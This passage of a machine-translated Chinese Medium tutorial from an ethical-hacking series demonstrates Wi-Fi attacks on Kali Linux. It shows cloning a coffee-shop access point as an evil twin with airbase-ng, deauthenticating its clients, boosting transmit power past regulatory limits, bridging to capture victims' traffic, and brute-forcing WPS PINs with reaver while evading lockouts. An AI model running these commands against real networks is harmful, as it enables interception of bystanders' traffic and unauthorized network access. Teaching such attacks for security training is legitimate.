it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">airbase-ng --help</strong></span><span id="c853" class="mf mg it ng b gy no nl l nm nn">Airbase-ng 1.6  - (C) 2008-2020 Thomas d'Otreppe<br/>  Original work: Martin Beck<br/>  <a class="ae me" href="https://www.aircrack-ng.org" rel="noopener ugc nofollow" target="_blank">https://www.aircrack-ng.org</a></span><span id="ee15" class="mf mg it ng b gy no nl l nm nn">usage: airbase-ng &lt;options&gt; &lt;replay interface&gt;</span><span id="bbd4" class="mf mg it ng b gy no nl l nm nn">Options:</span><span id="0dd9" class="mf mg it ng b gy no nl l nm nn">-a bssid         : set Access Point MAC address<br/>      -i iface         : capture packets from this interface<br/>      -w WEP key       : use this WEP key to en-/decrypt packets<br/>      -h MAC           : source mac for MITM mode<br/>      -f disallow      : disallow specified client MACs (default: allow)<br/>      -W 0|1           : [don't] set WEP flag in beacons 0|1 (default: auto)<br/>      -q               : quiet (do not print statistics)<br/>      -v               : verbose (print more messages)<br/>      -A               : Ad-Hoc Mode (allows other clients to peer)<br/>      -Y in|out|both   : external packet processing<br/>      -c channel       : sets the channel the AP is running on<br/>      -X               : hidden ESSID<br/>      -s               : force shared key authentication (default: auto)<br/>      -S               : set shared key challenge length (default: 128)<br/>      -L               : Caffe-Latte WEP attack (use if driver can't send frags)<br/>      -N               : cfrag WEP attack (recommended)<br/>      -x nbpps         : number of packets per second (default: 100)<br/>      -y               : disables responses to broadcast probes<br/>      -0               : set all WPA,WEP,open tags. can't be used with -z &amp; -Z<br/>      -z type          : sets WPA1 tags. 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104<br/>      -Z type          : same as -z, but for WPA2<br/>      -V type          : fake EAPOL 1=MD5 2=SHA1 3=auto<br/>      -F prefix        : write all sent and received frames into pcap file<br/>      -P               : respond to all probes, even when specifying ESSIDs<br/>      -I interval      : sets the beacon interval value in ms<br/>      -C seconds       : enables beaconing of probed ESSID values (requires -P)<br/>      -n hex           : User specified ANonce when doing the 4-way handshake</span><span id="21c5" class="mf mg it ng b gy no nl l nm nn">Filter options:<br/>      --bssid MAC      : BSSID to filter/use<br/>      --bssids file    : read a list of BSSIDs out of that file<br/>      --client MAC     : MAC of client to filter<br/>      --clients file   : read a list of MACs out of that file<br/>      --essid ESSID    : specify a single ESSID (default: default)<br/>      --essids file    : read a list of ESSIDs out of that file</span><span id="8de2" class="mf mg it ng b gy no nl l nm nn">--help           : Displays this usage screen</span></pre><p id="75e9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">"<strong class="kw iu"> airbase-ng </strong>"允许您创建或克隆无线接入点(AP)。克隆一个无线接入点就是“<strong class="kw iu">邪恶双胞胎</strong>攻击的完成方式。</p><p id="29d8" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我给你举个例子。你在一家咖啡店里运行“<strong class="kw iu"> airodump-ng </strong>”并扫描无线网络。您可以识别咖啡店提供的无线网络以及所有连接的设备。</p><p id="7bb3" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">因此，出于兴趣，让我们使用以下内容:</p><ul class=""><li id="6fe5" class="lq lr it kw b kx ky la lb ld ls lh lt ll lu lp lv lw lx ly bi translated">无线名称/ SSID:咖啡店</li><li id="790c" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">无线接入点MAC: E8:AD:A6:B0:46:C5</li><li id="a1cb" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated">频道:6</li></ul><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="01a6" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">airbase-ng -a E8:AD:A6:B0:46:C5 --essid "CoffeeShop" -c 6 wlan0</strong><br/>12:45:06  Created tap interface at0<br/>12:45:06  Trying to set MTU on at0 to 1500<br/>12:45:06  Access Point with BSSID E8:AD:A6:B0:46:C5 started.</span></pre><p id="d186" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">现在我们已经克隆了咖啡店中的实际接入点。通过向无线客户端发送断开信号，它们都将尝试重新连接。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="1409" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">aireplay-ng -0 0 -a E8:AD:A6:E0:45:A4 wlan0</strong></span></pre><p id="b5d3" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">因为你的设备会比实际的接入点更近并且有更强的信号，所以无线客户端都会与你的Kali实例相关联。还可以增强无线接入卡上的信号，增加无线客户端连接到您的机会。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="6174" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">ifconfig wlan0 down<br/></strong>root@kali:~# <strong class="ng iu">iw reg set BO<br/></strong>root@kali:~# <strong class="ng iu">ifconfig wlan0 up<br/></strong>root@kali:~# <strong class="ng iu">iwconfig wlan0 channel 13<br/></strong>root@kali:~# <strong class="ng iu">iwconfig wlan0 txpower 30</strong></span></pre><p id="17e4" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果我们在Kali linux实例中有两个网络接口卡，我们可以让第一个接口与实际的接入点配对，让第二个接口克隆无线客户端将连接的接入点。通过做一些巧妙的桥接、更新路由和更新IP表，你可以引导所有的流量通过你。</p><p id="8076" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我不打算在本文中讨论桥接部分，但是作为开始的提示，您需要安装"<strong class="kw iu">桥接工具</strong>"。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="dcaa" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">apt-get install bridge-utils -y</strong><br/>Reading package lists... Done<br/>Building dependency tree       <br/>Reading state information... Done<br/>bridge-utils is already the newest version (1.6-3).<br/>0 upgraded, 0 newly installed, 0 to remove and 330 not upgraded.</span></pre><p id="510e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">然后你会这样做…</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="b9f4" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">brctl addbr br0</strong></span><span id="6bbb" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">brctl show</strong><br/>bridge name bridge id  STP enabled interfaces<br/>br0  8000.000000000000 no</span><span id="0c7d" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">brctl addif br0</strong> &lt;interface1&gt;<br/>root@kali:~# <strong class="ng iu">brctl addif br0</strong> &lt;interface2&gt;<br/>root@kali:~# <strong class="ng iu">ifconfig br0 up</strong></span></pre><p id="ebc6" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果你想试试这个，在Debian wiki 中有一个很好的<a class="ae me" href="https://wiki.debian.org/BridgeNetworkConnections" rel="noopener ugc nofollow" target="_blank">解释。</a></p><h1 id="9d06" class="ns mg it bd mh nt nu nv mk nw nx ny mn jz nz ka mq kc oa kd mt kf ob kg mw oc bi translated"><strong class="ak">利用WPS </strong></h1><p id="b987" class="pw-post-body-paragraph ku kv it kw b kx my ju kz la mz jx lc ld np lf lg lh nq lj lk ll nr ln lo lp im bi translated">从安全角度来看，WPS是一个有点疯狂的功能。我不知道为什么大多数无线路由器都是开着的。我建议把这个关掉。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="1ab3" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">wash -i wlan0</strong><br/>BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID<br/>--------------------------------------------------------------------------------<br/>D0:57:94:B8:AC:F6    1  -66  1.0  <strong class="ng iu">No</strong>             REMOVED<br/>26:4C:E3:5C:8E:73    1  -14  2.0  <strong class="ng iu">No</strong>   Broadcom  REMOVED<br/>58:EF:68:07:BE:07    1  -84  2.0  <strong class="ng iu">No</strong>   RealtekS  REMOVED<br/>40:C7:29:22:43:7E   11  -98  2.0  <strong class="ng iu">No</strong>   Broadcom  REMOVED</span></pre><p id="59fe" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果您运行"<strong class="kw iu"> wash </strong>"并在"<strong class="kw iu"> Lck </strong>"栏中看到"<strong class="kw iu"> No </strong>",则路由器易受攻击。</p><p id="fa04" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我们来看第一个使用“<strong class="kw iu">掠夺者</strong>”的。</p><pre class="kj kk kl km gt nf ng nh ni aw nj bi"><span id="d3b8" class="mf mg it ng b gy nk nl l nm nn">root@kali:~# <strong class="ng iu">iwconfig wlan0 channel 6</strong></span><span id="e940" class="mf mg it ng b gy no nl l nm nn">root@kali:~# <strong class="ng iu">reaver -b D0:57:94:B8:AC:F6 -i wlan0 -c 1 -vv</strong></span><span id="5f3c" class="mf mg it ng b gy no nl l nm nn">Reaver v1.6.1 WiFi Protected Setup Attack Tool<br/>Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;<a class="ae me" href="mailto:cheffner@tacnetsol.com" rel="noopener ugc nofollow" target="_blank">cheffner@tacnetsol.com</a>&gt;</span><span id="10a3" class="mf mg it ng b gy no nl l nm nn">[+] Switching wlan0 to channel 1<br/>[+] Waiting for beacon from D0:57:94:B8:AC:F6<br/>[+] Associated with D0:57:94:B8:AC:F6 (ESSID: REMOVED)<br/>[+] Trying pin "12345670"</span></pre><p id="d44f" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你要知道，开启了WPS的像样的路由器会试图阻止这些攻击。如果你有一定数量的失败尝试在一段时间内，它将被限制和阻止一段时间。处理的方式是提供“<strong class="kw iu"> -r 4:60 </strong>”，这意味着每60秒尝试4次。</p><p id="f14b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">为了进一步阅读，看看我写的关于这个话题的19个故事。</p><div class="od oe gp gr of"><div role="button" tabindex="0" class="ab bv gv cb fp og oh bn oi ks ex"><div class="oj l"><div class="ab q"><div class="l di"><img alt="Michael Whittle" class="l de bw ok ol fe" src="../Images/f4d39d0c62b7f2e165491c1e2a8c6e26.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*efn30YXRNnd9uk7qbTOGnA.jpeg"/><div class="fb bw l ok ol fc n aw fd"/></div><div class="hh l fo"><p class="bd b dl z fp fq fr fs ft fu fv fw dk translated">迈克尔·惠特尔</p></div></div><div class="oo op gw l"><h2 class="bd iu tv lq fp tw fr fs tx fu fw is bi translated">道德黑客培训课程</h2></div><div class="ab q"><div class="l fo"><a class="bd b be z bi ty au tz ua ub qj uc an eh ei ud ue uf el em eo de bk ep" href="https://whittle.medium.com/list/ethical-hacking-training-course-710769700b83?source=post_page-----cd44cd1445b7--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="ug l fo"><span class="bd b dl z dk">19 stories</span></div></div></div><div class="pb dh pc fp ab pd fo di"><div class="di ot bv ou ov"><div class="dh l"><img alt="" class="dh" src="../Images/57c6829d9a7a0ff6d78e5d828845bb8c.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*UJZPySDP-tEonnesSAbLgA.png"/></div></div><div class="di ot bv ow ox oy"><div class="dh l"><img alt="" class="dh" src="../Images/e2d3aa85ee76ceb2b889dd753c231b67.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*rt1tdkIaxU8p69xo_yz9zg.jpeg"/></div></div><div class="di bv oz pa oy"><div class="dh l"><img alt="" class="dh" src="../Images/6240cd235d84e9cd8cb158d7147a71f5.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*78Op5N9xBfarPgmmwpHCQQ.jpeg"/></div></div></div></div></div><h1 id="5b44" class="ns mg it bd mh nt nu nv mk nw nx ny mn jz nz ka mq kc oa kd mt kf ob kg mw oc bi translated">迈克尔·惠特尔</h1><ul class=""><li id="5302" class="lq lr it kw b kx my la mz ld na lh nb ll nc lp lv lw lx ly bi translated"><strong class="kw iu"> <em class="ph">如果你喜欢这个，请</em> </strong> <a class="ae me" href="https://whittle.medium.com/" rel="noopener"> <strong class="kw iu"> <em class="ph">跟我上媒</em> </strong> </a></li><li id="737a" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> <em class="ph">更多有趣的文章，请</em> </strong> <a class="ae me" href="https://medium.com/trading-data-analysis" rel="noopener"> <strong class="kw iu"> <em class="ph">关注我的刊物</em> </strong> </a></li><li id="5d7b" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> <em class="ph">对通敌感兴趣？</em> </strong> <a class="ae me" href="https://www.linkedin.com/in/miwhittle/" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu"> <em class="ph">我们上LinkedIn </em> </strong> </a>连线吧</li><li id="e1a5" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> <em class="ph">支持我和其他媒体作者</em> </strong> <a class="ae me" href="https://whittle.medium.com/membership" rel="noopener"> <strong class="kw iu"> <em class="ph">在此报名</em> </strong> </a></li><li id="872e" class="lq lr it kw b kx lz la ma ld mb lh mc ll md lp lv lw lx ly bi translated"><strong class="kw iu"> <em class="ph">请别忘了为文章鼓掌:)←谢谢！</em> </strong></li></ul></div></div>    
</body>
</html>